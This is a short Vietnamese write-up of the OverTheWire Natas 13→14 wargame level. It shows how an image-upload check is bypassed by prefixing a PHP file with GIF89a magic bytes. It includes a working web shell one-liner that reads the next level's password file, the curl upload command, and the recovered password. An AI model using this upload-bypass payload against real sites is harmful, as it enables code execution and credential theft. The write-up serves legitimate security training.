# Natas 13 → 14

## Mục tiêu

Vượt kiểm tra ảnh bằng GIF magic bytes.

## Tôi thấy

File bắt đầu bằng `GIF89a` nên qua kiểm tra ảnh, phần PHP vẫn được server chạy.

## Cách làm

```bash
printf 'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' > x.php
curl -u natas13:<password> -F "uploadedfile=@x.php;type=image/gif" -F "filename=x.php" http://natas13.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Image check chỉ kiểm tra header; extension `.php` vẫn được xử lý.

## Kết quả

Password của `natas14`:

```text
GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBb
```
